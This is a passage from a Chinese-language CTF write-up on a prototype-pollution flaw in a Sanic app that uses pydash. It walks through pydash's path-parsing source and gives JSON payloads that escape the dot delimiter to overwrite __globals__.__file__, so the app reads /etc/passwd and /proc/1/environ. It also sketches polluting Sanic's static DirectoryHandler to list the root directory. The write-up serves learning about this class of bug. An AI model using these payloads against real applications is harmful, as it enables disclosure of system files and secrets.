value)</span><br></pre></td></tr></table></figure><p>​算是，好消息吧，直接就看到了 path，我们传入的 key 或许就是这个叫 path 的东西，毕竟那个链子看起来也很像是路径。好，没啥内容，跟进 <code>set_with(obj, path, value)</code> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">set_with</span>(<span class="params">obj, path, value, customizer=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`set_` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns undefined path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str | list): Target path to set value to.</span></span><br><span class="line"><span class="string">        value (mixed): Value to set.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Modified `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; set_with(&#123;&#125;, &#x27;[0][1]&#x27;, &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionchanged:: 4.3.1</span></span><br><span class="line"><span class="string">        Fixed bug where a callable `value` was called when being set.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> update_with(obj, path, pyd.constant(value), customizer=customizer)</span><br></pre></td></tr></table></figure><p>​盯着 path，继续跟进：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">update_with</span>(<span class="params">obj, path, updater, customizer=<span class="literal">None</span></span>):  <span class="comment"># noqa: C901</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This method is like :func:`update` except that it accepts customizer which is invoked to produce</span></span><br><span class="line"><span class="string">    the objects of path. If customizer returns ``None``, path creation is handled by the method</span></span><br><span class="line"><span class="string">    instead. The customizer is invoked with three arguments: ``(nested_value, key, nested_object)``.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        obj (list|dict): Object to modify.</span></span><br><span class="line"><span class="string">        path (str|list): A string or list of keys that describe the object path to modify.</span></span><br><span class="line"><span class="string">        updater (callable): Function that returns updated value.</span></span><br><span class="line"><span class="string">        customizer (callable, optional): The function to customize assigned values.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        mixed: Updated `obj`.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Warning:</span></span><br><span class="line"><span class="string">        `obj` is modified in place.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Example:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        &gt;&gt;&gt; update_with(&#123;&#125;, &#x27;[0][1]&#x27;, lambda: &#x27;a&#x27;, lambda: &#123;&#125;)</span></span><br><span class="line"><span class="string">        &#123;0: &#123;1: &#x27;a&#x27;&#125;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    .. versionadded:: 4.0.0</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">callable</span>(updater):</span><br><span class="line">        updater = pyd.constant(updater)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> customizer <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="built_in">callable</span>(customizer):</span><br><span class="line">        call_customizer = partial(callit, clone, customizer, argcount=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> customizer:</span><br><span class="line">        call_customizer = partial(callit, customizer, argcount=getargcount(customizer, maxargs=<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        call_customizer = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    default_type = <span class="built_in">dict</span> <span class="keyword">if</span> <span class="built_in">isinstance</span>(obj, <span class="built_in">dict</span>) <span class="keyword">else</span> <span class="built_in">list</span></span><br><span class="line">    tokens = to_path_tokens(path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pyd.is_list(tokens):  <span class="comment"># pragma: no cover</span></span><br><span class="line">        tokens = [tokens]</span><br><span class="line"></span><br><span class="line">    last_key = pyd.last(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(last_key, PathToken):</span><br><span class="line">        last_key = last_key.key</span><br><span class="line"></span><br><span class="line">    target = obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx, token <span class="keyword">in</span> <span class="built_in">enumerate</span>(pyd.initial(tokens)):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(token, PathToken):</span><br><span class="line">            key = token.key</span><br><span class="line">            default_factory = pyd.get(tokens, [idx + <span class="number">1</span>, <span class="string">&quot;default_factory&quot;</span>], default=default_type)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            key = token</span><br><span class="line">            default_factory = default_type</span><br><span class="line"></span><br><span class="line">        obj_val = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        path_obj = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> call_customizer:</span><br><span class="line">            path_obj = call_customizer(obj_val, key, target)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> path_obj <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            path_obj = default_factory()</span><br><span class="line"></span><br><span class="line">        base_set(target, key, path_obj, allow_override=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            target = base_get(target, key, default=<span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">except</span> TypeError <span class="keyword">as</span> exc:  <span class="comment"># pragma: no cover</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                target = target[<span class="built_in">int</span>(key)]</span><br><span class="line">                _failed = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                _failed = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> _failed:</span><br><span class="line">                <span class="keyword">raise</span> TypeError(<span class="string">f&quot;Unable to update object at index <span class="subst">&#123;key!r&#125;</span>. <span class="subst">&#123;exc&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    value = base_get(target, last_key, default=<span class="literal">None</span>)</span><br><span class="line">    base_set(target, last_key, callit(updater, value))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure><p>​继续跟进 path，似乎整个函数里就只有一个： <code>tokens = to_path_tokens(path)</code> ，还是无脑根：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">to_path_tokens</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Parse `value` into :class:`PathToken` objects.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> pyd.is_string(value) <span class="keyword">and</span> (<span class="string">&quot;.&quot;</span> <span class="keyword">in</span> value <span class="keyword">or</span> <span class="string">&quot;[&quot;</span> <span class="keyword">in</span> value):</span><br><span class="line">        <span class="comment"># Since we can&#x27;t tell whether a bare number is supposed to be dict key or a list index, we</span></span><br><span class="line">        <span class="comment"># support a special syntax where any string-integer surrounded by brackets is treated as a</span></span><br><span class="line">        <span class="comment"># list index and converted to an integer.</span></span><br><span class="line">        keys = [</span><br><span class="line">            PathToken(<span class="built_in">int</span>(key[<span class="number">1</span>:-<span class="number">1</span>]), default_factory=<span class="built_in">list</span>)</span><br><span class="line">            <span class="keyword">if</span> RE_PATH_LIST_INDEX.<span class="keyword">match</span>(key)</span><br><span class="line">            <span class="keyword">else</span> PathToken(unescape_path_key(key), default_factory=<span class="built_in">dict</span>)</span><br><span class="line">            <span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">filter</span>(<span class="literal">None</span>, RE_PATH_KEY_DELIM.split(value))</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">elif</span> pyd.is_string(value) <span class="keyword">or</span> pyd.is_number(value):</span><br><span class="line">        keys = [PathToken(value, default_factory=<span class="built_in">dict</span>)]</span><br><span class="line">    <span class="keyword">elif</span> value <span class="keyword">is</span> UNSET:</span><br><span class="line">        keys = []</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        keys = value</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>​这儿不知道怎么操作了，但是跟进  <code>RE_PATH_KEY_DELIM</code>  后得到了个正则表达式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RE_PATH_KEY_DELIM = re.<span class="built_in">compile</span>(<span class="string">r&quot;(?&lt;!\\)(?:\\\\)*\.|(\[\d+\])&quot;</span>)</span><br></pre></td></tr></table></figure><p>​问了下 ai，ai 的回复中有一点儿值得注意：</p><blockquote><p>请注意，这个正则表达式在处理复杂的转义序列时可能不是完美的，特别是当字符串中包含连续的转义字符（如  <code>\\\\.</code> ），这些字符可能意图表示一个实际的点号但前面有偶数个反斜杠。此外，如果点号后面紧跟的是字母或其他非数字字符，它仍然会被匹配为分隔符，即使这可能不是预期的。</p></blockquote><p>​我个人已经别无他法了，照着它给的这个这 <code>\\\\.</code>  试着绕了一下，结果成功了，payload 如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/etc/passwd&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>​访问 src 路由，成功读取到了文件：</p><p><img data-src="https://i-blog.csdnimg.cn/direct/550d038c156f4d6b8438ed492ff66ab8.png#pic_center" alt="在这里插入图片描述"></p><p>​好了，照理来说，这个题目如果这样的话已经成功了，利用如下 payload 直接读取进程的环境变量即可：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;key&quot;</span>  <span class="punctuation">:</span> <span class="string">&quot;__init__\\\\.__globals__\\\\.__file__&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;value&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;/proc/1/environ&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><img data-src="https://i-blog.csdnimg.cn/direct/a9da93b14d1f46dba7baadaca4c8ba51.png#pic_center" alt="在这里插入图片描述"></p><p>​但是，看了下大佬们的 wp 似乎有另一种姿势，算是一种非预期吧。</p><p><strong>下面跟着大佬们走：</strong></p><p>​先看如下位置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line">Session(app)</span><br></pre></td></tr></table></figure><p>​跟进 static ()，得到如下内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">static</span>(<span class="params"></span></span><br><span class="line"><span class="params">    self,</span></span><br><span class="line"><span class="params">    uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">    file_or_directory: <span class="type">Union</span>[PathLike, <span class="built_in">str</span>],</span></span><br><span class="line"><span class="params">    pattern: <span class="built_in">str</span> = <span class="string">r&quot;/?.+&quot;</span>,</span></span><br><span class="line"><span class="params">    use_modified_since: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    use_content_range: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    stream_large_files: <span class="type">Union</span>[<span class="built_in">bool</span>, <span class="built_in">int</span>] = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    name: <span class="built_in">str</span> = <span class="string">&quot;static&quot;</span>,</span></span><br><span class="line"><span class="params">    host: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    strict_slashes: <span class="type">Optional</span>[<span class="built_in">bool</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    content_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    apply: <span class="built_in">bool</span> = <span class="literal">True</span>,</span></span><br><span class="line"><span class="params">    resource_type: <span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    directory_view: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">    directory_handler: <span class="type">Optional</span>[DirectoryHandler] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params"></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Register a root to serve files from. The input can either be a file or a directory.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This method provides an easy and simple way to set up the route necessary to serve static files.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        uri (str): URL path to be used for serving static content.</span></span><br><span class="line"><span class="string">        file_or_directory (Union[PathLike, str]): Path to the static file</span></span><br><span class="line"><span class="string">            or directory with static files.</span></span><br><span class="line"><span class="string">        pattern (str, optional): Regex pattern identifying the valid</span></span><br><span class="line"><span class="string">            static files. Defaults to `r&quot;/?.+&quot;`.</span></span><br><span class="line"><span class="string">        use_modified_since (bool, optional): If true, send file modified</span></span><br><span class="line"><span class="string">            time, and return not modified if the browser&#x27;s matches the</span></span><br><span class="line"><span class="string">            server&#x27;s. Defaults to `True`.</span></span><br><span class="line"><span class="string">        use_content_range (bool, optional): If true, process header for</span></span><br><span class="line"><span class="string">            range requests and sends  the file part that is requested.</span></span><br><span class="line"><span class="string">            Defaults to `False`.</span></span><br><span class="line"><span class="string">        stream_large_files (Union[bool, int], optional): If `True`, use</span></span><br><span class="line"><span class="string">            the `StreamingHTTPResponse.file_stream` handler rather than</span></span><br><span class="line"><span class="string">            the `HTTPResponse.file handler` to send the file. If this</span></span><br><span class="line"><span class="string">            is an integer, it represents the threshold size to switch</span></span><br><span class="line"><span class="string">            to `StreamingHTTPResponse.file_stream`. Defaults to `False`,</span></span><br><span class="line"><span class="string">            which means that the response will not be streamed.</span></span><br><span class="line"><span class="string">        name (str, optional): User-defined name used for url_for.</span></span><br><span class="line"><span class="string">            Defaults to `&quot;static&quot;`.</span></span><br><span class="line"><span class="string">        host (Optional[str], optional): Host IP or FQDN for the</span></span><br><span class="line"><span class="string">            service to use.</span></span><br><span class="line"><span class="string">        strict_slashes (Optional[bool], optional): Instruct Sanic to</span></span><br><span class="line"><span class="string">            check if the request URLs need to terminate with a slash.</span></span><br><span class="line"><span class="string">        content_type (Optional[str], optional): User-defined content type</span></span><br><span class="line"><span class="string">            for header.</span></span><br><span class="line"><span class="string">        apply (bool, optional): If true, will register the route</span></span><br><span class="line"><span class="string">            immediately. Defaults to `True`.</span></span><br><span class="line"><span class="string">        resource_type (Optional[str], optional): Explicitly declare a</span></span><br><span class="line"><span class="string">            resource to be a `&quot;file&quot;` or a `&quot;dir&quot;`.</span></span><br><span class="line"><span class="string">        index (Optional[Union[str, Sequence[str]]], optional): When</span></span><br><span class="line"><span class="string">            exposing against a directory, index is  the name that will</span></span><br><span class="line"><span class="string">            be served as the default file. When multiple file names are</span></span><br><span class="line"><span class="string">            passed, then they will be tried in order.</span></span><br><span class="line"><span class="string">        directory_view (bool, optional): Whether to fallback to showing</span></span><br><span class="line"><span class="string">            the directory viewer when exposing a directory. Defaults</span></span><br><span class="line"><span class="string">            to `False`.</span></span><br><span class="line"><span class="string">        directory_handler (Optional[DirectoryHandler], optional): An</span></span><br><span class="line"><span class="string">            instance of DirectoryHandler that can be used for explicitly</span></span><br><span class="line"><span class="string">            controlling and subclassing the behavior of the default</span></span><br><span class="line"><span class="string">            directory handler.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        List[sanic.router.Route]: Routes registered on the router.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Examples:</span></span><br><span class="line"><span class="string">        Serving a single file:</span></span><br><span class="line"><span class="string">        ```python</span></span><br><span class="line"><span class="string">        app.static(&#x27;/foo&#x27;, &#x27;path/to/static/file.txt&#x27;)</span></span><br></pre></td></tr></table></figure><pre><code>        Serving all files from a directory:        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.static(<span class="string">&#x27;/static&#x27;</span>, <span class="string">&#x27;path/to/static/directory&#x27;</span>)</span><br></pre></td></tr></table></figure>        Serving large files with a specific threshold:        <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.static(<span class="string">&#x27;/static&#x27;</span>, <span class="string">&#x27;path/to/large/files&#x27;</span>, stream_large_files=<span class="number">1000000</span>)</span><br></pre></td></tr></table></figure>    &quot;&quot;&quot;  # noqa: E501    name = self.generate_name(name)    if strict_slashes is None and self.strict_slashes is not None:        strict_slashes = self.strict_slashes    if not isinstance(file_or_directory, (str, bytes, PurePath)):        raise ValueError(            f&quot;Static route must be a valid path, not &#123;file_or_directory&#125;&quot;        )    try:        file_or_directory = Path(file_or_directory).resolve()    except TypeError:        raise TypeError(            &quot;Static file or directory must be a path-like object or string&quot;        )    if directory_handler and (directory_view or index):        raise ValueError(            &quot;When explicitly setting directory_handler, you cannot &quot;            &quot;set either directory_view or index. Instead, pass &quot;            &quot;these arguments to your DirectoryHandler instance.&quot;        )    if not directory_handler:        directory_handler = DirectoryHandler(            uri=uri,            directory=file_or_directory,            directory_view=directory_view,            index=index,        )    static = FutureStatic(        uri,        file_or_directory,        pattern,        use_modified_since,        use_content_range,        stream_large_files,        name,        host,        strict_slashes,        content_type,        resource_type,        directory_handler,    )    self._future_statics.add(static)    if apply:        self._apply_static(static)</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​注释里面存在这两句话：</span><br><span class="line"></span><br><span class="line">```tex</span><br><span class="line">            directory_view (bool, optional): Whether to fallback to showing</span><br><span class="line">                the directory viewer when exposing a directory. Defaults</span><br><span class="line">                to `False`.</span><br><span class="line">            directory_handler (Optional[DirectoryHandler], optional): An</span><br><span class="line">                instance of DirectoryHandler that can be used for explicitly</span><br><span class="line">                controlling and subclassing the behavior of the default</span><br><span class="line">                directory handler.</span><br></pre></td></tr></table></figure><p>​大致意思就是 directory_view 为 True 时，会开启列目录功能，directory_handler 中可以获取指定的目录。跟进下 <code>directory_handler</code>  ，如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> directory_handler:</span><br><span class="line">    directory_handler = DirectoryHandler(</span><br><span class="line">        uri=uri,</span><br><span class="line">        directory=file_or_directory,</span><br><span class="line">        directory_view=directory_view,</span><br><span class="line">        index=index,</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><p>​再跟进 <code>DirectoryHandler</code> ，发现如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        uri: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        directory: Path,</span></span><br><span class="line"><span class="params">        directory_view: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        index: <span class="type">Optional</span>[<span class="type">Union</span>[<span class="built_in">str</span>, <span class="type">Sequence</span>[<span class="built_in">str</span>]]] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>) -&gt; <span class="literal">None</span>:</span><br></pre></td></tr></table></figure><p>​我们发现只要我们将 directory 污染为根目录，directory_view 污染为 True，就可以看到根目录的所有文件了。</p><p><strong>后续我在 Windows 上测试次次运行不了，这里就直接借一下大佬们的代码在这儿，我就不实操了</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sanic <span class="keyword">import</span> Sanic</span><br><span class="line"><span class="keyword">from</span> sanic.response <span class="keyword">import</span> text, html</span><br><span class="line"><span class="comment">#from sanic_session import Session</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="comment"># pydash==5.1.2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pollute</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Sanic(__name__)</span><br><span class="line">app.static(<span class="string">&quot;/static/&quot;</span>, <span class="string">&quot;./static/&quot;</span>)</span><br><span class="line"><span class="comment">#Session(app)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="comment">#async def index(request):</span></span><br><span class="line">    <span class="comment">#return html(open(&#x27;static/index.html&#x27;).read())</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span 